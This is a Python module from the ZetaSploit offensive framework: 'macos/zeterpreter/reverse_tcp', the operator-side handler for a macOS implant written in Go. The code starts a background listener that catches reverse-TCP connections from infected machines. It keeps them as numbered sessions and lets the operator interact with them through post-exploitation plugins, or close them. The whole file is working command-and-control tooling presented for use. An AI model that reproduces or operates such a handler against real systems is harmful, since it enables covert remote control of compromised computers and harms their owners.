#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import os
import sys
import socket
import time
import threading

from core.menus import menus
from core.badges import badges
from core.helper import helper
from core.loader import loader
from core.exceptions import exceptions

from data.macos.zeterpreter.reverse_tcp.core.listener import listener

class ZetaSploitModule:
    def __init__(self):
        self.menus = menus()
        self.badges = badges()
        self.helper = helper()
        self.listener = listener()
        self.loader = loader()
        self.exceptions = exceptions()

        self.thread = None
        self.controller = None
        self.sessions_id = dict()
        self.is_running = False
        
        self.details = {
            'Name':        "macos/zeterpreter/reverse_tcp",
            'Authors':     ['enty8080'],
            'Description': "macOS implant written in golang and compiled for macOS.",
            'Comment':     "First macOS implant in history written in golang! Yay!",
            'HasOptions': True,
            'HasCommands': True
        }
        
        self.options = {
            'LHOST': {
                'Description': "Local host.",
                'Value':       self.helper.getip(),
                'Required':    True
            },
            'LPORT': {
                'Description': "Local port",
                'Value':       self.helper.lport,
                'Required':    True
            },
        }

        self.commands = {
            'interact': {
                'Description': "Interact with session.",
                'Usage': "interact <session_id>",
                'ArgsCount': 1,
                'NeedsArgs': True,
                'Args': [],
                'Run': self.interact
            },
            'close': {
                'Description': "Close active session.",
                'Usage': "close <session_id>",
                'ArgsCount': 1,
                'NeedsArgs': True,
                'Args': [],
                'Run': self.close
            },
            'sessions': {
                'Description': "List all active sessions.",
                'Usage': "list",
                'ArgsCount': 0,
                'NeedsArgs': False,
                'Args': [],
                'Run': self.sessions
            }
        }

    def interact(self):
        session_id = self.commands['interact']['Args'][0]
        try:
            self.shell(self.sessions_id[int(session_id)])
        except:
            self.helper.output(self.badges.E + "Invalid session!")

    def close(self):
        session_id = self.commands['close']['Args'][0]
        try:
            session = self.sessions_id[int(session_id)]
            session.close_connection()
            self.helper.output(self.badges.G + "Closing session "+str(session_id)+"...")
            del self.sessions_id[int(session_id)]
        except:
            self.helper.output(self.badges.E + "Invalid session!")

    def sessions(self):
        if not self.sessions_id:
            self.helper.output(self.badges.E + "No active sessions!")
        else:
            for session in self.sessions_id.keys():
                self.helper.output(str(session))

    def start_background_listener(self, local_host, local_port):
        self.is_running = True
        id_number = 0
        while True:
            if self.is_running:
                session = self.listener.listen(local_host, local_port)
                if session:
                    self.sessions_id[id_number] = session
                    self.helper.output(self.badges.S + "Session "+str(id_number)+" opened!")
                    id_number += 1
            else:
                return

    def start_background_server(self, local_host, local_port):
        self.thread = threading.Thread(target=self.start_background_listener, args=(local_host, local_port))
        self.thread.setDaemon(False)
        self.thread.start()

    def stop_background_server(self):
        self.helper.output(self.badges.G + "Cleaning up...")
        for session in self.sessions_id.keys():
            session = self.sessions_id[session]
            session.close_connection()
        self.is_running = False
        if self.thread:
            self.thread.join()

    def shell(self, controller):
        plugins = self.loader.load_plugins('zeterpreter', 'multi', controller)
        self.menus.main_plugins_menu(plugins, 'zeterpreter')
            
    def run(self):
        local_host = self.options['LHOST']['Value']
        local_port = self.options['LPORT']['Value']

        self.helper.output(self.badges.G + "Starting server...")
        try:
            self.start_background_server(local_host, local_port)
            self.helper.output(self.badges.S + "Server started successfully!")
        except exceptions.GlobalException:
            self.helper.output(self.badges.E + "Failed to start server!")
